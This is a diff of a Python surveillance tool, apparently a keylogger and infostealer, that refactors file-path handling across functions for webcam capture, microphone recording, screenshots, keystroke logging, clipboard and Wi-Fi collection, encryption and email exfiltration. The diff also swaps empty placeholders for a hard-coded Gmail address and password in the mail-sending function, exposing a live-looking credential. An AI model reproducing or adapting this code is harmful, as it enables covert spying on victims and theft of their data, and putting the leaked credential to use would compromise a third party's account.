@@ -94,15 +94,8 @@ def EmailAttach(path: str, attach_file: str):
     # Create the email attachment object #
     attach = MIMEBase('application', "octet-stream")
 
-    # If the OS is Windows #
-    if os.name == 'nt':
-        attach_path = f'{path}\\{attach_file}'
-    # If the OS is Linux #
-    else:
-        attach_path = f'{path}/{attach_file}'
-
     # Set file content as attachment payload #
-    with open(attach_path, 'rb') as attachment:
+    with open(f'{path}{attach_file}', 'rb') as attachment:
         attach.set_payload(attachment.read())
 
     # Encode attachment file in base64 #
@@ -139,8 +132,8 @@ Returns:    Nothing
 '''
 def SendMail(path: str, re_xml, re_txt, re_png, re_jpg, re_wav):
     # User loging information #
-    email_address = ''          # <--- Enter your email address
-    password = ''               # <--- Enter email password
+    email_address = 'ngimbel64@gmail.com'          # <--- Enter your email address
+    password = 'kkkieveeyerddgxf'               # <--- Enter email password
 
     # Create message object with text and attachments #
     msg = MIMEMultipart()
@@ -185,16 +178,9 @@ Returns:    Nothing
 ########################################################################################################################
 '''
 def Webcam(file_path: str):
-    # If the OS is Windows #
-    if os.name == 'nt':
-        # Create directory for webcam picture storage #
-        cam_path = f'{file_path}\\WebcamPics'
-        pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
-    # If the OS is Linux #
-    else:
-        # Create directory for webcam picture storage #
-        cam_path = f'{file_path}/WebcamPics'
-        pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
+    # Create directory for webcam picture storage #
+    cam_path = f'{file_path}WebcamPics'
+    pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
 
     # Initialize video capture instance #
     cam = cv2.VideoCapture(0)
@@ -250,11 +236,11 @@ def Microphone(file_path: str):
         # If the OS is Windows #
         if os.name == 'nt':
             # Save the recording as wav file #
-            write_rec(f'{file_path}\\{x}mic_recording.wav', fs, my_recording)
+            write_rec(f'{file_path}{x}mic_recording.wav', fs, my_recording)
         # If the OS is Linux #
         else:
             # Save the recording as mp4 file #
-            write_rec(f'{file_path}/{x}mic_recording.mp4', fs, my_recording)
+            write_rec(f'{file_path}{x}mic_recording.mp4', fs, my_recording)
 
 
 '''
@@ -266,16 +252,9 @@ Returns:    Nothing
 ########################################################################################################################
 '''
 def Screenshot(file_path: str):
-    # If the OS is Windows #
-    if os.name == 'nt':
-        # Create directory for screenshot storage #
-        screen_path = f'{file_path}\\Screenshots'
-        pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
-    # If the OS is Linux #
-    else:
-        # Create directory for screenshot storage #
-        screen_path = f'{file_path}/Screenshots'
-        pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
+    # Create directory for screenshot storage #
+    screen_path = f'{file_path}Screenshots'
+    pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
 
     for x in range(0, 60):
         # Capture screenshot #
@@ -302,16 +281,9 @@ Returns:    Nothing
 ########################################################################################################################
 '''
 def LogKeys(file_path: str):
-    # If the OS is Windows #
-    if os.name == 'nt':
-        # Set the log file and format #
-        logging.basicConfig(filename=f'{file_path}\\key_logs.txt', level=logging.DEBUG,
-                            format='%(asctime)s: %(message)s')
-    # If the OS is Linux #
-    else:
-        # Set the log file and format #
-        logging.basicConfig(filename=f'{file_path}/key_logs.txt', level=logging.DEBUG,
-                            format='%(asctime)s: %(message)s')
+    # Set the log file and format #
+    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
+                        format='%(asctime)s: %(message)s')
 
     # Join the keystroke listener thread #
     with Listener(on_press=lambda key: logging.info(str(key))) as listener:
@@ -343,24 +315,17 @@ def main():
     # If the OS is Windows #
     if os.name == 'nt':
         export_path = 'C:\\Tmp\\'
-        # Ensure the tmp exfiltration dir exists #
-        pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)
-
-        # Format program file names #
-        network_file = f'{export_path}\\network_info.txt'
-        sysinfo_file = f'{export_path}\\system_info.txt'
-        browser_file = f'{export_path}\\browser_info.txt'
-
     # If the OS is Linux #
     else:
-        export_path = '/tmp/logs'
-        # Ensure the tmp exfiltration dir exists #
-        pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)
+        export_path = '/tmp/logs/'
 
-        # Format program file names #
-        network_file = f'{export_path}/network_info.txt'
-        sysinfo_file = f'{export_path}/system_info.txt'
-        browser_file = f'{export_path}/browser_info.txt'
+    # Ensure the tmp exfiltration dir exists #
+    pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)
+
+    # Format program file names #
+    network_file = f'{export_path}network_info.txt'
+    sysinfo_file = f'{export_path}system_info.txt'
+    browser_file = f'{export_path}browser_info.txt'
 
     try:
         # Open the network information file in write mode and log file in write mode #
@@ -401,7 +366,7 @@ def main():
     if os.name != 'nt':
         try:
             # Open the network SSID list file in write mode #
-            with open(f'{export_path}/wifi_info.txt', 'w') as wifi_list:
+            with open(f'{export_path}wifi_info.txt', 'w') as wifi_list:
                 try:
                     # Get the available Wi-Fi networks with  nmcli #
                     get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
@@ -489,7 +454,7 @@ def main():
 
         try:
             # Write the clipboard contents to output file #
-            with open(f'{export_path}\\clipboard_info.txt', 'w') as clipboard_info:
+            with open(f'{export_path}clipboard_info.txt', 'w') as clipboard_info:
                 clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
 
         # If IO error during file operation #
@@ -562,28 +527,20 @@ def main():
 
     # Iterate through files to be encrypted #
     for file in files:
-        # If the OS is Windows #
-        if os.name == 'nt':
-            plain_path = f'{export_path}\\{file}'
-            crypt_path = f'{export_path}\\e_{file}'
-        else:
-            plain_path = f'{export_path}/{file}'
-            crypt_path = f'{export_path}/e_{file}'
-
         try:
             # Read the file plain text data #
-            with open(plain_path, 'rb') as plain_text:
+            with open(f'{export_path}{file}', 'rb') as plain_text:
                 data = plain_text.read()
 
             # Encrypt the file data #
             encrypted = Fernet(key).encrypt(data)
 
             # Write the encrypted data to fresh file #
-            with open(crypt_path, 'wb') as hidden_data:
+            with open(f'{export_path}e_{file}', 'wb') as hidden_data:
                 hidden_data.write(encrypted)
 
             # Delete the plain text data #
-            os.remove(plain_path)
+            os.remove(f'{export_path}{file}')
 
         # If error occurs during file operation #
         except (IOError, OSError) as file_err:
@@ -604,15 +561,14 @@ def main():
 
     # Exfiltrate encrypted results via email #
     SendMail(export_path, re_xml, re_txt, re_png, re_jpg, re_audio)
-
     # If the OS is Windows #
     if os.name == 'nt':
-        SendMail(f'{export_path}\\Screenshots', re_xml, re_txt, re_png, re_jpg, re_audio)
-        SendMail(f'{export_path}\\WebcamPics', re_xml, re_txt, re_png, re_jpg, re_audio)
-    # If the OS Linux #
+        SendMail(f'{export_path}Screenshots\\', re_xml, re_txt, re_png, re_jpg, re_audio)
+        SendMail(f'{export_path}WebcamPics\\', re_xml, re_txt, re_png, re_jpg, re_audio)
+    # If the OS is Linux #
     else:
-        SendMail(f'{export_path}/Screenshots', re_xml, re_txt, re_png, re_jpg, re_audio)
-        SendMail(f'{export_path}/WebcamPics', re_xml, re_txt, re_png, re_jpg, re_audio)
+        SendMail(f'{export_path}Screenshots/', re_xml, re_txt, re_png, re_jpg, re_audio)
+        SendMail(f'{export_path}WebcamPics/', re_xml, re_txt, re_png, re_jpg, re_audio)
 
     # Clean Up Files #
     shutil.rmtree(export_path)
